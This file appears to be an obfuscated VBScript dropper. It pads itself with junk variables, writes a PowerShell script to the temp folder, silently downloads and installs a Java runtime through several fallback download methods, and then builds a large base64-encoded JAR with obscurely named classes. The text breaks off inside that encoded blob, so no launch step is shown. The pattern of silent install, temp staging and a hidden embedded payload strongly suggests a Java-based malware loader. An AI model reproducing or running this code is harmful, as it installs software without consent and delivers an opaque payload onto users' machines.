'a57b2431
If False Then
LIwXLia=5529
End If
Dim dmnjhzi:Set dmnjhzi=Nothing
Rem 85ed2755

Dim WS:Set WS=CreateObject("WScript.Shell")
Dim FSO:Set FSO=CreateObject("Scripting.FileSystemObject")
Dim tmp:tmp=WS.ExpandEnvironmentStrings("%TEMP%")
Dim tf:tf=tmp&"\jrun.ps1"
Dim sf:sf=tmp&"\jsentinel.lock"
'fbd385336a2641
Dim bkRlHt:bkRlHt=False
Dim mzpohtN:mzpohtN=6512
Dim YfuDscme:YfuDscme=8966
Dim LGSYWcRQ:LGSYWcRQ=5002

Dim fh:Set fh=FSO.CreateTextFile(tf,True,False)
fh.WriteLine "param([string]$sf)"
fh.WriteLine "if($sf -and (Test-Path $sf)){Remove-Item $sf -Force -EA 0}"
fh.WriteLine "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]""Tls12,Tls11,Tls"""
fh.WriteLine "$tmp=""$env:TEMP\JL$(Get-Random)"""
fh.WriteLine "New-Item -Path $tmp -ItemType Directory -Force|Out-Null"
fh.WriteLine "$msi=""$tmp\jsetup.msi"""
fh.WriteLine "$dlOK=$false"
fh.WriteLine "if(-not $dlOK){try{&bitsadmin /transfer ""JDL"" /download /priority FOREGROUND ""https://github.com/adoptium/temurin21-binaries/releases/download/jdk-21.0.7%2B6/OpenJDK21U-jre_x64_windows_hotspot_21.0.7_6.msi"" $msi 2>$null|Out-Null;if((Test-Path $msi)-and(Get-Item $msi).Length-gt 10MB){$dlOK=$true}else{if(Test-Path $msi){Remove-Item $msi -Force}}}catch{}}"
fh.WriteLine "if(-not $dlOK){try{Invoke-WebRequest ""https://github.com/adoptium/temurin21-binaries/releases/download/jdk-21.0.7%2B6/OpenJDK21U-jre_x64_windows_hotspot_21.0.7_6.msi"" -OutFile $msi -UseBasicParsing -TimeoutSec 300;if((Test-Path $msi)-and(Get-Item $msi).Length-gt 10MB){$dlOK=$true}else{if(Test-Path $msi){Remove-Item $msi -Force}}}catch{}}"
fh.WriteLine "if(-not $dlOK){try{(New-Object Net.WebClient).DownloadFile(""https://github.com/adoptium/temurin21-binaries/releases/download/jdk-21.0.7%2B6/OpenJDK21U-jre_x64_windows_hotspot_21.0.7_6.msi"",$msi);if((Test-Path $msi)-and(Get-Item $msi).Length-gt 10MB){$dlOK=$true}else{if(Test-Path $msi){Remove-Item $msi -Force}}}catch{}}"
fh.WriteLine "if(-not $dlOK){try{&bitsadmin /transfer ""JDL2"" /download /priority FOREGROUND ""https://api.adoptium.net/v3/installer/latest/21/ga/windows/x64/jre/hotspot/normal/eclipse?project=jdk"" $msi 2>$null|Out-Null;if((Test-Path $msi)-and(Get-Item $msi).Length-gt 10MB){$dlOK=$true}else{if(Test-Path $msi){Remove-Item $msi -Force}}}catch{}}"
fh.WriteLine "if(-not $dlOK){try{Invoke-WebRequest ""https://api.adoptium.net/v3/installer/latest/21/ga/windows/x64/jre/hotspot/normal/eclipse?project=jdk"" -OutFile $msi -UseBasicParsing -TimeoutSec 300;if((Test-Path $msi)-and(Get-Item $msi).Length-gt 10MB){$dlOK=$true}else{if(Test-Path $msi){Remove-Item $msi -Force}}}catch{}}"
fh.WriteLine "if(-not $dlOK){try{(New-Object Net.WebClient).DownloadFile(""https://api.adoptium.net/v3/installer/latest/21/ga/windows/x64/jre/hotspot/normal/eclipse?project=jdk"",$msi);if((Test-Path $msi)-and(Get-Item $msi).Length-gt 10MB){$dlOK=$true}else{if(Test-Path $msi){Remove-Item $msi -Force}}}catch{}}"
fh.WriteLine "if($dlOK){"
fh.WriteLine "  Start-Process msiexec.exe -ArgumentList ""/i `""$msi`"" ADDLOCAL=FeatureMain,FeatureEnvironment,FeatureJarFileRunWith,FeatureJavaHome /quiet /norestart"" -Wait -PassThru|Out-Null"
fh.WriteLine "  Remove-Item $msi -Force -EA 0"
fh.WriteLine "}"
fh.WriteLine "$mp=[Environment]::GetEnvironmentVariable(""Path"",""Machine"");if($mp){$env:Path=$mp+"";""+$env:Path}"
fh.WriteLine "$jexe=$null"
fh.WriteLine "$c=Get-Command java -EA 0;if($c){$jexe=$c.Source}"
fh.WriteLine "if(-not $jexe){$dirs=@($env:ProgramFiles);if(${env:ProgramFiles(x86)}){$dirs+=${env:ProgramFiles(x86)}};$f=Get-ChildItem -Path $dirs -Filter java.exe -Recurse -EA 0|Select-Object -First 1;if($f){$jexe=$f.FullName}}"
fh.WriteLine "if(-not $jexe){foreach($rk in @(""HKLM:\SOFTWARE\JavaSoft\Java Runtime Environment"",""HKLM:\SOFTWARE\JavaSoft\JDK"",""HKLM:\SOFTWARE\WOW6432Node\JavaSoft\Java Runtime Environment"")){if(Test-Path $rk){$s=Get-ChildItem $rk -EA 0|Select-Object -First 1;if($s){$h=(Get-ItemProperty $s.PSPath -EA 0).JavaHome;if($h-and(Test-Path ""$h\bin\java.exe"")){$jexe=""$h\bin\java.exe"";break}}}}}"
fh.WriteLine "if($jexe){"
fh.WriteLine "  $jb64="""""
fh.WriteLine "  $jb64+=""UEsDBBQACAgIAAU801wAAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgICAAFPNNcAAAAAAAAAAAAAAAAFAAAAE1FVEEtSU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWqBAlY6BnE"""
fh.WriteLine "  $jb64+=""G1sYKmj4FyUm56QqOOcXFeQXJZYA1WvycvkmZubpOuckFhdbKbgF5odGuHsX8nLxcgEAUEsHCK33KdpaAAAAWwAAAFBLAwQUAAgICAAFPNNcAAAAAAAAAAAAAAAABwAAAEYuY2xhc3OVVV1XGlcU3ZcPwREMQesH2sSa1gKKJNFEE2xTRFEiggqiaNN0hAmOGQc7DtXk"""
fh.WriteLine "  $jb64+=""IQ9d/Qld/QF56UP7UI1iV+zS9rW/oX+ltecOiBLz0oeZe+fcc/fZZ59z7/z179sTAMMoMrCoDYzBtSF+KwYVUS0Ek2sbUk63wUyLEj0TDO74xXJK12S1EKKFAoMnPB6ZmIxOTccez8RnE8m5+YVUejGztJxdsaORfBQG02qEJnl6HtMzVUMr6bISXBDVfHGT0JzheDyc"""
fh.WriteLine "  $jb64+=""Ti7EdicmZ5MMwu07d4eG790fGX1gh5uh1eu7SsKBZjgaYcIHDjRVZu0OXIOLzzrPs7oUyIYuBpsq7eoxVWeweGO+mAMf4oaAbtysk6ESwoaPGBrGZFXWP2ewelcjvowDt/CxgF58QvmIDOZ4lBJoudiaXteKO+KaItngY2jzxq4mzFEaYOM8Bxi873O5mm4l9KBAm4IU"""
fh.WriteLine "  $jb64+=""OsZgH8spVW5mry9Tl3G8mBM5hWHKcyGZTNcLX1klBe9jpBH3MMrQpBfjxR1Ji4jbVPc+71Xv95bgIUJcjDEHnJWEiEz7u37jJVnJS5oNX/AUhgSEMU7Cyuq2pFEhBs8FqEv3iqmKQkEnMMkxooQhbm1JKrVXwPv/IKYR4xDUlHa9WFl0II5Wbpyt9AYJ6jEAtqVcSZP1"""
fh.WriteLine "  $jb64+=""F8EUn0jnzTQnYB7jPKN+XpSUAAtPq/ciaExRpIKohLVCaVNS9cndnLSly0XVhoyAJUMDRVIL+rpRQOrFLFa4mqsM1y/krxzJbRueMDRr0jclWZMSRTVRUpSLQl06vHV5V00OPMXXAr6CaFQ6si5qYU0TX/BMfasRB3LI88gSTyfJ06Hz7YwU1W1dVPWMqJSoKSyRYp4G"""
fh.WriteLine "  $jb64+=""Z0oXc89nxa0073KGa3FZlRKlzTVJq1rcRsdkRE3m31WjkCqWtJwUlRUJPRTAQpeQDZ38INCsE3YaGWSamyDAzY+0YXca625+2I2RDrhhv37Jv4VQSDO00nuDLD/CSlYg5I9b7a+yof4DtJ28xi0+evqzB+h4egAPfXWclNEz/D3Youens79Pj9Gb5T5H6PuVtpvxnN43"""
fh.WriteLine "  $jb64+=""YT6jWCZGD92WZ+gjI334/zEGExSDlwUm80Nidwo/jUFzCJtkdxAjC0bwKbx8F2+WKsc5sptpbPYPzMwOdPn3ETjC7T0jH47Ii2BheThNbw2kHvK2kLWCVJndMdD5zEXedtzFUBV92sAGBtzCPh6U8dkbPDpGOHuEiL3hpVsoY2ofj8qYcbfQq4zEGwT2DIbnscFCVIMZ"""
fh.WriteLine "  $jb64+=""g3Oyihqv6trq7wrF+48x71nJLhPmwhHS7zLfQYvpF4N5m1FtV425q8qcIw9Wkf8kO++IKX9gJtFFSizarS9fo+kYS4S/fOov40tLw3eXLIGB37D2B7oP4ekKrND6s0N0/G61ZJcP0bZXq14rTGdoh8WGXipWN68XNQqneYOKamVl+lMF0M5MdFt30HX5M91gfYianhnU"""
fh.WriteLine "  $jb64+=""/QatSI16pCZ6pCp6ZUY/TCOdc/lHjW+Swu8acT15dYT1ennAfkCjaanWIqgVlkE1PK3/AVBLBwhBTXl5fAQAAKgHAABQSwMEFAAICAgABTzTXAAAAAAAAAAAAAAAAAcAAABnLmNsYXNzjVRtU9tGEH5ONsgW8mvMS4khkLSJsRtMW2jaktICMYQgMIkJwU7fZFl1lBjL"""
fh.WriteLine "  $jb64+=""leUGZjr0Y38PabEz9UzzLZ3mt/Q3lO7JCuAGOvHMee/2dm+f3WdXr/75/Q8A0ygzsLIIxhB+rP6opitqtZzOFh/rmi3CQ5c6rTsMQcW5Nsz0klHRZ0m5zDDcpcw27FrDztmWru6QQWBeUeY3s/dWdm9l1rIM8Y5xlay1R2q1qlfqjptiak/IvPemUTXsOYb+hHKChF4z"""
fh.WriteLine "  $jb64+=""quXZiS2GCyfazK6m12zDrIoIMngSE1syZIQleBGR4YPfDwEXZEjo47t+Gb0Q+W6QQT4NWcQ7DIP/DbfQMCol3RJxUUIcEQa/HmmE56SfQw0fRhl8S3fN+9vLqz+IGGO4ehbeN1UczWUJ47jSVercXt3Wd0S8x9BX1u0Ny6zplr0n4xq3vooEVcao1knHMJlYeZtQLnyK"""
fh.WriteLine "  $jb64+=""mESKZ/A+ZVDXa6ql2qbFED0L3CTSfgxjisKptZpeLTFcf6vETqJ9iI94tGmK9lOg7p/z7gWpXh9TvWyzY8sQS5xZmk/wKXf9jNMYkAjHTWowlahVyrNdzG8+ssynapEz92V3HZ2nRCy8NieGV7KnGuUWtev5DShiiUG09Iqu1nUZt3kzLWOFYei8DhexytCjVUxuv8bt"""
fh.WriteLine "  $jb64+=""FawT6gxDJNE9LJ32vMst7jFIRPNiJz7D+Ot6vIHKNaHibOI+d6URGPlfUxHbDN4KZcMweu67zrjJKOChhDy+oqpc2Q+UpEZ4KloM1EUtMtWnLRQH9+U9+akP30gIcTK8i2aJvgSBnK1qT9bU2ibngCGkGFV9vbFT1C1XE6X31cqWahn87CqlYx7qdMiZDUvTORaM0Ux6"""
fh.WriteLine "  $jb64+=""6TvkoUUjCv6j8XUkDS/981vqCTCotHtFNgLJjWRqVWGpAsunCi1EDxE7xMAhhlJtDOfbiOdbGOnx7UcvPce7zzHRxPVn+KCJmSSt6A1SkmxitoXPyengxYMDen+QE0jZelCkCHEIR0QrwETMH5EURCzy4HQOQSPFZULqxV8IwkBE+BUxTy99XxahsBGsCzeQ9UyiRHYD"""
fh.WriteLine "  $jb64+=""To4K5vCFkw/fpSkeTRrCbl6/OGdgLPkbBl5C4qKJOyRiLxHgoomsi5NjG0XGxXkR3uARYTgBylyUGTgwhykMWACi5zaCQgH9goo4K+MSYg48uRPYhcewcQwq5ZxpHfD0ncd6uUL4+5Qjjh0lchQcx11iid/NJPOFNpTkw/x2nnIYaiFHTDnJPGjia6KM0vwT4TZC+ei3"""
fh.WriteLine "  $jb64+=""xEoL3704cNqh6PyzaSfqAHoo6gT6PSLGhTauCVlMC72nUMy4KHSnwtSXtL53UPf8C1BLBwheyysH4gMAAOoGAABQSwMEFAAICAgABTzTXAAAAAAAAAAAAAAAAAcAAABrLmNsYXNzjVcNXFzVlf+fNx9vGB7JzCQkDIR8f5ABQkISjIOBBPKFzEACJDCQxEzgBUbIDMxH"""
fh.WriteLine "  $jb64+=""EqJCTLtaXVtd220b3arbrsVau412d6BixHVttHbVddfarW7V7uqua7u63bZW68f03Pdmho8MKj9+896759x7z/2fc/7n3Kc/fvhRAJvoWgL1yiCC7Wr/CX9Znz/YXdZ49Gq1MyrDwEKVkLPd49ne0thUd2rHTm8joaioo8Yzqd0cDQeC3ZVrLx0izJsc23mqU+2PBkJB"""
fh.WriteLine "  $jb64+=""GZaUIBgIldUMRtWa2LFjaliGlWA8Gfb3E5y8R3LF6UqVChTkWJGNOQRDtxpVYNO/7YR1RZcakVrnVFlneLA/GiprVjvDarReHeSlzJhnhYT5BPu+NbXe1mWHvIdzthmi5kHlpAULCJZd+0L723bXD8jII6zOsH6Gc4t1861woiB50PTetYH+HnHQQkI2214XjET9wU7G"""
fh.WriteLine "  $jb64+=""eO2sK8+Yy4svwVIrFmMZYfk0hUi/2lm2u9a71x/2H1ejariZB2SsIJivCAQD0Sp+KapjPA4oWIXVVqzEGgZciAg1RXW6BRG1MxYORAfLBEIzhrQdtvd1h/ir5/i0fSrFqmvhEpYVE7LC6nE/rxzsZi8Vra1TUIp1wktl0yJNP6mMDQS5K7QrEPT3CSPZxo4aBRuxSSy3"""
fh.WriteLine "  $jb64+=""mWAqSpl9mRXl2MKB6SdIHTUER6a4m1+UMRwVbYzjaVegT5XBgMyd1Krt80ciMraxz9g1e8OhKCcBx+uOkDgJg51aMw3HTB32TQ1qrdiOHYTFn6wrYxdnFm9UG+pSm0OxsIiCRZdsMSnlxfegzorduJKQN5uWDI8eWp5Qp1/sxnCnFg2q0bL9TR5eqAGNVnixN4VIUiKj"""
fh.WriteLine "  $jb64+=""iaGOhvY31V0yrY6ntWC/Fc04MH1anYw2dp/AzB/tUdCOrVb40EHIzRTUmhcPWVGNwww/z9p+NBLqi0VVffYRMbsa7N25/Twh2hz1d/a2hP0CHg4knt2JLiuyoE5jl5aecOik/6jwKkdcXmaGEuGycOZwTSzQ1yVy8mphGC/dC45B4lVyPalwqQv2x9iSsOo/zjAEEcri"""
fh.WriteLine "  $jb64+=""5O5PGTBdQUaYk4rfuhgUtqOuTkR/FDErIjghLO9LCzQsBkVEn+aw9/f3q0GeVfqZWCZpN9tzLa4TVg8xW0VDulDBGYFjL65nW0L5oXwLPsdiXj7Syqk7i2vaFfwZbhDm3MgmBoJd6qnGY7Po8pluws1C98852yOxoxFNQFhQxAfLxIlfxJeE+q3MtZPSumBU7Rbo/wWb"""
fh.WriteLine "  $jb64+=""1+8PR1QeUfBlsfTt+IqMSrH/2o5M2Tw3HYTNoc5elQvW1wnW7CONA45BTyTnOgvuEOZcOjUJ/F9ZcQ7fIFxYtb9ivfe0fViprmmr2FFe3VzVXNjTltO5wFUz6NhqOJJdRcNzC3t22mO2rStOykM8fijn6uxr5wx4V3mW1mzZPKhEc7rt60t21CxrqmoqrtmdPdSy0rc+"""
fh.WriteLine "  $jb64+=""f/WBy2v2OY7MiW2OPXamI7vLu2rfGs+KlvVXdrh2lB1sWD9nMCtW0ypHsobr1y87ZRueG/Ou2VfVVLVvdfsKT1HL+g0DxgHbYHJWYU9zzpASo67sYcVVE5kzbI/pnr1bz6PGWDQdhCIF1qbDd6qEHfHX+KY4+bcYcZ4mSmuEo6RIo9x78W3hpBGm0EyzZXyHGeIkk46q"""
fh.WriteLine "  $jb64+=""4LuCjO/HAzxyrC8W4eT9W5E/9+P7hDladZtiz8Ip9kxPpwfxkDDnBwRY8PccePuDvcHQyaAFo7xyZ18ownv9UKx8Dg+zg5uWte1UrlGGc4cseEQk1cNiT5aY1YGYvy8yI2D1ZkYL7sfwD+Jwj3PlaFpmwRPMlJEcVemyBZYNm2MWXBRTZwvep8TUHzMzlFvwE7YyOdOC"""
fh.WriteLine "  $jb64+=""Z9hK/8KYeH2OxS4LnmdmyBCxMv5VNE+XCmahKhPbInxixouiSfkZ+8vf1yd4XRX+rZutP/o5XhKV9mUmTMZZwS/0/ugVYWc47B9U8JrwcjZ+yR3N9ELSEGqOdfakK/yUnu0/Ca4MzUBd8IS/L9DFvYJoAqbov8ERVN60tmXl8s2DC065rjNENrStWN662oL/JhRmbsh2"""
fh.WriteLine "  $jb64+=""+TujofCgjP8hbPz0hmjmPK01+pUVb+HXXEovbY321uxM2injbfZ9NFTb4w9vF5Do8V+r4P/wG+Hn/zeAw5GJraijdpKpf2/FO3iXsOTStdO26Mu/p2VAUA2zr3QRoaIoUzeVnDLr2fhQf8QH4lAfMpll1pHxMecFZ9zOYCd3Al0K2/7tbCSI23oD97UWMogEzFgTxcHI"""
fh.WriteLine "  $jb64+=""ZMX7ZBY6dbPEYmEqd0WkaZBNowXKspIVfYITBvmNFA3etK5CczjieHyuiOYARzNxt07cZWz5bOkw+91C0EnjZNxRbtL1ZbFooK/sdKC/rD3QP7U808JUE5DsA6cJnVbKF41JXlFGttLhWmSlPOIWXmHIG9RTDHs0zCGUn6K4qVtrskqFltBSMYubdnMgGFHDUXFbyYT2"""
fh.WriteLine "  $jb64+=""7IWeVtBKrum0ShRclYuln6NeoTW4IgvVVJQMj0t3l8ml92cN3K4rVMKdARVTKbsoENkRCKta8mjdVbtCZbReSLkhNx/v7QqEIwpt5CHeYBNvqzV5YZVLNFVojRpdlmpGk2hOD4vLudhPIinkSQgrreSmK5KNveiPqErAUy2GFf4RfJ7j7+pqjvX3h9VIRO2a9Mn0hk8s"""
fh.WriteLine "  $jb64+=""SLW0w4oe2iks4oOZPZE5A/ZOC+3hKNtkIe6YLZ2hYJT7bi4PBVPXERTQzIVD5WuYKBLkIS8zADWwOaKyGEW7ZvD0csBd+Zli9TNGr+HQ6lUWamFrppOClw/r71Z3BLrVSFQm7rU3zN4OZp4leJDarNRKPoYi1t/FJKRQB1drHjrIQ12amkKHRVK20lVasu5RTyV7R/KL"""
fh.WriteLine "  $jb64+=""Ync7HWXVPjXYzW05dYnbWzlpd5TaT2xGqVvEaI+25n7uaMO1fi7gdLUIl3LqZZfvtx3NOWqh41a8Lrr4/OlHaRYvapM/2BXiAOq30oDwQFaQ80xrVRSKiJMMEGeQUVx8uPvxBIJqQ+z4UTXcIkJCXAq5TPYd8IcD4js5aE3TBAdBjnax8Pr7U0L9/iRCFEu52hoh/hRu"""
fh.WriteLine "  $jb64+=""182Qma9O8FccVpj4edRVXO8pHsNcr63UdnjoEYvR19ZQUhqHw1U6htx6x8IxLBrDcrexxOc0Woynx7HS1e5r89mrz9i3JYZKR1EUR0kc67Wpvnqe2TaOclZ2xVExisvP8y4SneTf1WyBkXbx77uYLyl87whylXsLxdIfsEu6je9wf0QL/ZxOse4Cze7DcKOSv/S3K0A0"""
fh.WriteLine "  $jb64+=""qH0xiNpptvKIOE0ftCKHleOo9jmcceyMgy3ZF0drHAdHcVUcR89P1BObdOy8plmAQl5BotP8zhx+UEbPNhlZmp2LGSWgFVlSDA6+khTwe6HhINv6OFZICW3nQBLH7ydx7JjEcaut4dNwtH0cTePY+h170YuZcdQxnAngBTYsivl0O5ySV6QHig3zsAtnGcACvtj+fgqA"""
fh.WriteLine "  $jb64+=""rWkAWzMCuC55jDf5yAZ+RmXLWc2A+nH0+kZx3PMQBizm0672R+M46dtq+9B0+h5kjyOLhacmin3C1S5WWDSKa+IYZrjPOj7PR43jC+cSF4tHuDXT/yZY4jWbTpe0J+W3xHGbzzuGv3xAO59whAvGj2CX8VUZvR9iESWwgkeJfZMQ9ukCEgO9Gh7lHNSg7YzHK7BLx7HE"""
fh.WriteLine "  $jb64+=""sAirpXKso3exjdaj0bCW7/ivwCe9gcPSYvRjz4zzf00PIOMCXp+dTu+N45zPcScbaDth8w2N4q56xz385XH54vgbr4Xt9xXHcV8c34vjvIaUJ4lUQxx/5xYZcgHlwoNmecgRb/aZzGcdY81uk9PIA8U6jBVmHcclTqPT5GMfjwvlC7xPs64+gt0TpRq2xQxZrjkTuA+m"""
fh.WriteLine "  $jb64+=""9rWvrrQfekIPOY/TOAVyMbl42o7zS0u0oBqPg8cnRlBQeskuvETiKeEuRzyOf7wDFxw/4j3dZseYxzHm5ZA+21DqczypO9F2lW3d0JE4nnabDU5zu+Of0r51m0tHYHYbS0sdzyZ1q2z1mq7HUDxV05NW/OekYqNti6boNZRMVfQ6TSOQ3QyagQ9vYJD5/E4zG+34F01p"""
fh.WriteLine "  $jb64+=""mH0zzAY2M6zGkubzTpPQ1ZFlWJ2m8/WTDkqO+4wsOQ+ZVnO93MsU0EQxjpIsuobuom9xlAA30Wv8vBk/0p7PkEU8KYte1b612GVOsSXgg1nGOS1O7+cglRGR8QKQQFk6jgH5UhUSOu4psZ5Rh4WRFQnO7E9ZS+RHgglBF5an/oWQX4Q4K8HsMENsnBSXq6xSw89j/Kzl"""
fh.WriteLine "  $jb64+=""8QRTz2xm23VzdOp8Fhv5ywqHtBV59D6WSR1w0Z0olVqwUbqVueiLnJkB+OgpdKOJb7xrcZJ24wwewA14iTG+F9+Q1uC70ln8AB/gcekpPGU4xLdUO98F/wuvSxuYq2L4FW3C2xjCbwwOMmEDWaTTNN+wgvnvBlrMrdIy6QX25zyqlH5CXjrEPl1Fx6Q9nOtW9ut8upV+"""
fh.WriteLine "  $jb64+=""SvdQNd0rbaYnpbfoGamUnqW76SU8Rr+ge+k1g4l+KQ1rHPHTJEfeL9iXnwdcXluDbevQGP6tvtjF5O5JkTsTfjsnMFN7sUbt9Y/bN10YcqWonVmjwud51PXokTH8u6+B0/DV0naO2Ffb4viP6SwvSQ5O42Ww0wvIxzlUSF9GlXQBuymEega9SfpamuXN2KtxO9JvM1l+"""
fh.WriteLine "  $jb64+=""XvIEw0mWrxTFyvGmZvT/esfxjuC037ocv7PHbrJnn2Da+wPz//u+Ejbxox+SxBcUMrL2KMmTZi7gumeUfosc6T6m6XdQghvhll6eUnwuS5qlv1UmzTKz7HV2JRtGFt0wmsc6ouYeyd+6SOMxt3GcrL5RynabubhULqow5S+6G24uRsyj5rO5Jia1qvzCI5WFMyqS08wK"""
fh.WriteLine "  $jb64+=""ptOFccpZlN/F00YSP+bBONmKx8ghrDdopaYOxgQXdllEO98o8FWSOWyJS86q5CClBhnueVNTbvoUaGBUIIeP8jOOrrOM1UYslD5CvuTBEukRlOIgNkjv4XI++nYGzYO5HPnVOGDYnQZLEg0OiW2kzK0OzdehMp7iFXJ410GXl9zyOOX5xinfVzJKBaO0uIHcRrsROoTm"""
fh.WriteLine "  $jb64+=""0jgt97lNF/GBaIuS5YLRK47T6odoLVOl0xSndTplcpNULz7Lz0FxxWlz60ji8Qkxjz+2iA6KNo+T2+capa1uC7mzWksFqtt8Fda7kOu0OM3CLdY4bR9JvMmlx2m5iA5n1kU4nZY41bhG0OC2upxZTlbZNYLtqdEtbqvT6nNnTbizxZRVYkqBJnRmjyCPpdnpSdbk+ASb"""
fh.WriteLine "  $jb64+=""tHse1aUqYb7+XS++qfGOhFV8u+WRBJVexD6n8SIWMBR7nfJ5LsOyqLm83PnJIZPPbZxwK6y8TCjnaRJlhBPbqTiNxdreWfrgBM/AHNyH7+FB9DBt3Yknk8/n2F0v4zW8wd9P4nnxzfe3DUxUPchDJ5NcD7pwp/a8i1ZqTzHeyPPEuHiKcX5SOx2mTr4E7qZ92rgWs5yG"""
fh.WriteLine "  $jb64+=""+Qksh0Xjao20Kc8EjZPLRZRumxKlrFQ9qSRTcUrtIxTI5DYlmFZS2hKyM2sLReb4JtZSErDAOrtaunLNrsMKSa1cKJ+oldLMMW5PHueTDRQan2JbdQJrZiA3BZRG3iY7wfk5A1skC6J2smkyYeIU6TzkZJQKvkgeJtuQ4GTW1YyzqyWdl9lOjWvaBWMwO5ikp5FnaMRy"""
fh.WriteLine "  $jb64+=""5oUSDrxmQxY6DDUcTL9GGE/jjGTELdwh38V88SR/P8fPD+htypY+oALpWq6Rz9NKKUK7paepkZ8n+Eab5iPeSSfv1Fuaj0j0H6t4F/3qVcaHEhcqEzPDvgfT1cEsBqW7tQUVXYEJromfgsya9cn0JS5Hgve/7iqp96YIintsJijRybl0avLMo/2iVlG73nvToaRqfZyO"""
fh.WriteLine "  $jb64+=""+NzmRyuMXCR8FaZc4zdxudOca9pYZV+TsLclhgqHxqjT1xCnY2Yjl4kcl81tiw3FKdDq+ryJSkW7m2sSJYK3OhunPi4QE7xdkJM+xFue1+rYGYbxdVyPL2hPvX4EYU62WL26p6AVDK2CFE8ZTlUSEaQ50xu36ROR0JBIZaQhHQJi6HUNUzczj5E+5vvpfVhDOxj6z3Fl"""
fh.WriteLine "  $jb64+=""jXJlXYF9dCOukvay42txmr+vpydwC92M26Tf4SuYo/lhKaNt5K9UVdbfKP0mac3Ci0nH7mFtSYRD/hUFySshDXBJDjO7xlyTfcAcoScaZ+kJzDfkpD0uYX6ypBFdoxU2058AUEsHCHYzQgsnEgAAqyEAAFBLAwQUAAgICAAFPNNcAAAAAAAAAAAAAAAADgAAAEZRb1VY"""
fh.WriteLine "  $jb64+=""R0txLmNsYXNznVgJQFTX1f7Om+U9hgfCDKAQF1CjOKCgJmBcUAajIoOoqARJ1JEZBcUZmEVBEVKbblnatNmqaW1qbGka2yrakcREzGqTtE3bdE8a27Q1bZM2Sbe0+U34z33vzYKiTSu+d++799x7zz3Ld86Z5z949DSAa6RUgrJkVWDtDUtrOmQQIWObZ6enpM3j31pS"""
fh.WriteLine "  $jb64+=""t3mbrzksw0QgHz/LZVgJVycIWv07A9t9JbW+cEvAu8zj97b5QpPdgcD2SLsMhTD+yqQybASrTs/bt/Cznp/NhEy3ttLvC5fUB5q3+8LzeHwZwe5O7FgfDrb6t4qJLfy08uPhp4afHfxU87OYn62EbH1Ra6Ck2t8eCfM6n2eHWNfGj5eQE5+vi4SHESwlpFW63ZVr6lZX"""
fh.WriteLine "  $jb64+=""dy6+vraOhTW/ua3V3xquIJgKp61TkYb0FEiYREifWV42Y+bM8hnl13EzU8HVKjJhF7NTVYzGGNGbRkiZOat8Rin/MUmRiiydZLqKXJ2kRIVDH5upYpw+Npu56VZwrYqx+lQ5AQquU5GtfzO78mLfFk+kLaxggYocfXghD6/1b/cHdvkVVKrI14erVEzQ+b6eNTDfuJC1"""
fh.WriteLine "  $jb64+=""0L113rR1BEdCytd3Nvvaw60Bv4xqFUsx0QYzalRYRU9C7TCDWdPCkvPKYDllFLpjZjVP21UsXmWDjNWE0YVJelwd8fs9m9t8Bs0aG1ZiLcESCnuCYRUN4qCVuIFXXax7V6S1zesLylhvQxNY8ym7TVtMFbbeUREFNxGmFF5qLtMuHRJS2Sgus2nYZeq7QmHfDhlsjqlb"""
fh.WriteLine "  $jb64+=""feGVwUC7LxjuUuEV1M1gj7C2+kM8RphRWP1hjjIY5hO3okXwzFarxoxvSWubT8Z2vkXI1+4JesKBoIodQl9t8PNZnvZ2n5/NdfqHulXiqHZ0iKOCbLDB1B4FzK5Z6cjqULCTzTkc0OkJWYUjyqYTXWL57gxMZBtkc8ke6XxW3V70CCH2jrLiZsLES1zf7dmx2ethAPBs"""
fh.WriteLine "  $jb64+=""8TTz5bpk7GPR7kgMEL6bvPcV0GXepSxcbuGarnbf/zapH3nltdMuna3ytLXVt4Z9LLtb8DEbPoqPs0g+IcQfYT0W/gf1xd1Bxadwq51B+jZeGoiEk4FsJS+L4ZSKO/DpFDbIz7Bip2wsXqvgszEXHk4q4y6Gg3Yx0OZXcY9Q2N24l2Bj+671hUKerT4VnxcKX479PJxw"""
fh.WriteLine "  $jb64+=""YWbBLbDWMczZA7sEpzK+yJbhFhagYcIDAh00hzokHLpHmM9hPjjo2+kLhthtrhrB0hL2+lX0iRVf0wCW44E92UEagixZ9viHCZMLnBVLU3usvdnNFVVXNedERk1a6aZedWfqrorw6L2jWt3dabsUfMOGI+J4U8ENExUcZWDZJfZQ0S84O4LjPNLcFgjxyLcF/0cQTZJe"""
fh.WriteLine "  $jb64+=""dV0SAA4Mi2jVfuYkGGkP+7xJNI+qGIUMgayPEUZdFMVknLZhEFEVebhK0DyRfFQiOMl4yoanBZ0V4wXds+yeIwUpGd+x4TnBcTrfvEcO5XSpu1zetFIFL3BgG8HUqnWU/Z7g4/si0Ggq+wFvwDaQxIIA6WkjBk4VP8JLYvmP+YK8KJkfwpikVcPCqYqf4mdi2c952WY5"""
fh.WriteLine "  $jb64+=""lNajRsib2mOpcFco+KUF2j/HJwXyt/l8nBCYC5cLZl/FOREAfn0R8ujJiYY89+A1Yci/HQ7f2n1l/J6h09cR8bSFLrPBehWv4w82nMcfGY0LNpYsKl881VW8qoQd6Q1ezFf0+Xeq+LMO+39hgPZlRjIq1A4RZt5mw+7NND7+yn6wXcbfCctHEP2HGblMePqnDf/Au/pR"""
fh.WriteLine "  $jb64+=""ps3UqeDf4jbTmkYm/z9BfkE45NeFdj9gma6y7mXwZ/5gLm+WNysksemNsFwmM6d4l8eoYSmZwrJxdYV9IaGsaU0ulWRSWJKUQhhbWH3FqESp7OWk8spAXiBPoXS+3U5PW8RXt+WiyB1T1Ah3pQzKFOfZ+YaFTS5hDP2UxS5B2TyypS0SalFptLDx52hMzIfEFar5Ven1"""
fh.WriteLine "  $jb64+=""Bhn0ZMpjlWo3WeHZwfDkvPLtk5YyA2NpnI2uovG6Ay0LhGJzKuUzkPJUwciYP8IZLEDk0yRWHk0W6h1BgNqVp4grT2XJ7fC0+oWbj6BHTuOkurzK2f/dX8tsV+l/81eZVxnrz64sFf3KWD/+uLQ2RhU/Ybb2V2o8s7WVs2OjlSOcUJl0grajRqef4ErwfdEJlcYTO8Ho"""
